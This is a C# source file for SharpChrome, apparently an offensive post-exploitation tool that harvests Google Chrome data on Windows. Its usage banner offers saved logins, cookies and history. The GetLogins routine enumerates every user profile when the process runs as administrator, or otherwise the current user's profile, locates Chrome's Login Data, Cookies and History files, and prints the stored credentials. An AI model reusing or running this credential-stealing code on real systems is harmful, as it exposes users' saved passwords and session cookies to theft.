using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using System.Reflection;
using CS_SQLite3;
using SharpChrome.Models;
using SharpChrome.Common;
using SharpChrome.Cryptography;

namespace SharpChrome
{
    public class Chrome
    {
        static void Usage()
        {
            string banner = @"
Usage:
    .\sharpchrome.exe arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chrome Bookmarks, History, Cookies and Logins.
    full      - The same as 'all'
    logins    - Retrieve all saved credentials that have non-empty passwords.
    history   - Retrieve user's history with a count of each time the URL was
                visited, along with cookies matching those items.
    cookies [domain1.com domain2.com] - Retrieve the user's cookies in JSON format.
                                        If domains are passed, then return only
                                        cookies matching those domains.
";

            Console.WriteLine(banner);
        }

        public static void GetLogins(string path="")
        {
            // Path builder for Chrome install location
            string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
            string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");

            string[] paths = new string[2];
            paths[0] = homeDrive + homePath + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data";
            paths[1] = localAppData + "\\Google\\Chrome\\User Data";
            //string chromeLoginDataPath = "C:\\Users\\Dwight\\Desktop\\Login Data";

            string userChromeHistoryPath = "";
            string userChromeBookmarkPath = "";
            string userChromeCookiesPath = "";
            string userChromeLoginDataPath = "";

            bool useTmpFile = false;
            // For filtering cookies
            
            // If Chrome is running, we'll need to clone the files we wish to parse.
            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
            if (chromeProcesses.Length > 0)
            {
                useTmpFile = true;
            }

            //foreach(string path in paths)
            //{

            //}
            //GetLogins(chromeLoginDataPath);

            // Main loop, path parsing and high integrity check taken from GhostPack/SeatBelt
            try
            {
                if (IsHighIntegrity())
                {
                    Console.WriteLine("\r\n\r\n=== Chrome (All Users) ===\r\n");
                    if (path != "")
                    {
                        userChromeHistoryPath = String.Format("{0}\\History", path);
                        userChromeBookmarkPath = String.Format("{0}\\Bookmarks", path);
                        userChromeCookiesPath = String.Format("{0}\\Cookies", path);
                        userChromeLoginDataPath = String.Format("{0}\\Login Data", path);
                        ChromiumCredentialManager chromeManager = new ChromiumCredentialManager(path);
                        string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
                        if (ChromeExists(chromePaths))
                        {
                            var logins = chromeManager.GetSavedLogins();
                            foreach (var login in logins)
                            {
                                login.Print();
                            }
                        }
                    }
                    else
                    {
                        string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                        string[] dirs = Directory.GetDirectories(userFolder);
                        foreach (string dir in dirs)
                        {
                            string[] parts = dir.Split('\\');
                            string userName = parts[parts.Length - 1];
                            userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", dir);
                            userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", dir);
                            userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
                            string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeLoginDataPath, userChromeCookiesPath };
                            path = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default", dir);
                            ChromiumCredentialManager chromeManager = new ChromiumCredentialManager(path);
                            if (ChromeExists(chromePaths))
                            {
                                // History parse
                                var logins = chromeManager.GetSavedLogins();
                                foreach (var login in logins)
                                {
                                    login.Print();
                                }
                            }
                        }
                    }
                }
                else
                {
                    if (path != "")
                    {
                        userChromeHistoryPath = String.Format("{0}\\History", path);
                        userChromeBookmarkPath = String.Format("{0}\\Bookmarks", path);
                        userChromeCookiesPath = String.Format("{0}\\Cookies", path);
                        userChromeLoginDataPath = String.Format("{0}\\Login Data", path);
                    }
                    else
                    {
                        path = paths[1]+ "\\Default";
                        userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                        userChromeBookmarkPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                        userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                        userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    }
                    ChromiumCredentialManager chromeManager = new ChromiumCredentialManager(path);
                    string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
                    if (ChromeExists(chromePaths))
                    {
                        var logins = chromeManager.GetSavedLogins();
                        foreach (var login in logins)
                        {
                            login.Print();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("  [X] Exception1: {0}", ex.Message);
            }
        }

        private static bool ChromeExists(string[] paths)
        {
            foreach(string path in paths)
            {
                if (File.Exists(path))
                {
                    return true;
                }
            }
            return false;
        }

        private static string CreateTempFile(string filePath)
        {
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");
            string newFile = "";
            newFile = Path.GetRandomFileName();
            string tempFileName = localAppData + "\\Temp\\" + newFile;
            File.Copy(filePath, tempFileName);
            return tempFileName;
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

    }
}
